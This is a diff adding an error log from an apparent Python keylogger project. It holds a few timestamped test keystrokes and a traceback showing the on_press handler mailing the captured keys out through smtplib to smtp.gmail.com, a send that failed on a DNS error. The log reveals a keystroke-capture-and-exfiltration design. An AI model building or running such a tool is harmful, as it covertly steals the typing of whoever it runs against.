@@ -1,0 +1,28 @@
+2020-11-12 01:19:17,955: 'a'
+2020-11-12 01:19:18,595: 's'
+2020-11-12 01:19:18,947: 'd'
+2020-11-12 01:19:19,275: 'f'
+2020-11-12 01:19:29,371: Key.enter
+2020-11-12 01:19:29,379: Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\SISC\AppData\Local\Programs\Python\Python38\lib\site-packages\pynput\_util\__init__.py", line 211, in inner
+    return f(self, *args, **kwargs)
+  File "C:\Users\SISC\AppData\Local\Programs\Python\Python38\lib\site-packages\pynput\keyboard\_win32.py", line 280, in _process
+    self.on_press(key)
+  File "C:\Users\SISC\AppData\Local\Programs\Python\Python38\lib\site-packages\pynput\_util\__init__.py", line 127, in inner
+    if f(*args) is False:
+  File "f:\chegg\keylogger\main.py", line 17, in on_press
+    mail.Mail().sendMail()
+  File "f:\chegg\keylogger\mail.py", line 13, in sendMail
+    email_session = smtplib.SMTP('smtp.gmail.com',587)
+  File "C:\Users\SISC\AppData\Local\Programs\Python\Python38\lib\smtplib.py", line 253, in __init__
+    (code, msg) = self.connect(host, port)
+  File "C:\Users\SISC\AppData\Local\Programs\Python\Python38\lib\smtplib.py", line 339, in connect
+    self.sock = self._get_socket(host, port, self.timeout)
+  File "C:\Users\SISC\AppData\Local\Programs\Python\Python38\lib\smtplib.py", line 308, in _get_socket
+    return socket.create_connection((host, port), timeout,
+  File "C:\Users\SISC\AppData\Local\Programs\Python\Python38\lib\socket.py", line 787, in create_connection
+    for res in getaddrinfo(host, port, 0, SOCK_STREAM):
+  File "C:\Users\SISC\AppData\Local\Programs\Python\Python38\lib\socket.py", line 918, in getaddrinfo
+    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
+socket.gaierror: [Errno 11001] getaddrinfo failed
